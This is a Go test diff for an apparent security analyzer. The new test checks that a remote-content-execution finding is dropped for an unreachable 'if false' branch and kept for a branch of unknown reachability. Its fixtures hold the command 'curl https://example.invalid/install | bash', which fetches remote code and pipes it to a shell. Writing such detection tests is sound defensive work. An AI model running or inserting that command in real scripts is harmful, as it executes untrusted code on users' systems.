@@ -29,6 +29,20 @@ func TestRemoteContentExecutionRequiresAFlowToShell(t *testing.T) {
 	}
 }
 
+func TestRemoteContentExecutionRespectsStaticReachability(t *testing.T) {
+	t.Parallel()
+
+	unreachable := analyzedSDK(t, "if false; then curl https://example.invalid/install | bash; fi\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(unreachable), "risk.remote-content-execution"); got != nil {
+		t.Fatalf("unreachable branch produced finding = %#v", got)
+	}
+
+	unknown := analyzedSDK(t, "if condition; then curl https://example.invalid/install | bash; fi\n", sdk.HookSetupBase)
+	if got := findFinding(finding.AnalyzeSDK(unknown), "risk.remote-content-execution"); got == nil {
+		t.Fatalf("unknown-reachability branch was dropped: %#v", finding.AnalyzeSDK(unknown))
+	}
+}
+
 func TestCDIsKnownInRootHooks(t *testing.T) {
 	t.Parallel()
 
